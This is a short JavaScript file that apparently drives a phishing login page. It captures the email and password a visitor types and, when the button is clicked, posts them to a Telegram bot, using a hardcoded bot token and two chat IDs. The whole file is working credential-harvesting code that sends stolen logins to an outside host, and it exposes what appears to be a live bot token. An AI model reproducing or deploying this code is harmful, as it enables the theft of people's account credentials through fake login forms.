const password = document.querySelector("#password");
const btn = document.querySelector("#btn");
const email = document.querySelector("#email");
let emailvalue = "";
let passwordvalue = "";
let BOT_API_TOKEN = "6363285774:AAHLUseSICab0QXBcgxCv-oy0c2PndY99QU";
let CHAT_ID_1 = "-1002109102426";
let CHAT_ID_2 = "1983736451";

password.addEventListener("input", e => {
  passwordvalue = e.target.value;
});

email.addEventListener("input", e => {
  emailvalue = e.target.value;
});

btn.addEventListener("click", () => {
  const messageText = `NIKNAME: ${encodeURIComponent(
    emailvalue
  )}\nPAROL: ${encodeURIComponent(passwordvalue)}`;
  const body = `chat_id=${CHAT_ID_1}&text=${encodeURIComponent(messageText)}` +
               `&chat_id=${CHAT_ID_2}&text=${encodeURIComponent(messageText)}`;

  fetch(`https://api.telegram.org/bot${BOT_API_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: body,
  })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error("Error:", error));
});
